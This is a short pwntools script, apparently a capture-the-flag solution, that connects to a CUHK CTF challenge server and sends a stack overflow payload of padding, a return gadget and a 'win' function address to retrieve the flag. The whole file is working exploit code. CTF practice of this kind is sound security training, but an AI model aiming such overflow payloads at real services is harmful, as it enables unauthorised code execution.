from pwn import *

context.log_level = 'debug'
# r = process("./chall")
r = remote("chal.24.cuhkctf.org", 24061)

ret_addr = p64(0x401016)
win_addr = p64(0x401176)
payload = b'12345'+b'a'*4+ret_addr+win_addr
r.sendline(payload)
r.recvuntil("I am crying ToT\n")
flag = r.recvall()
print(f"flag: {flag}")
# r.interactive()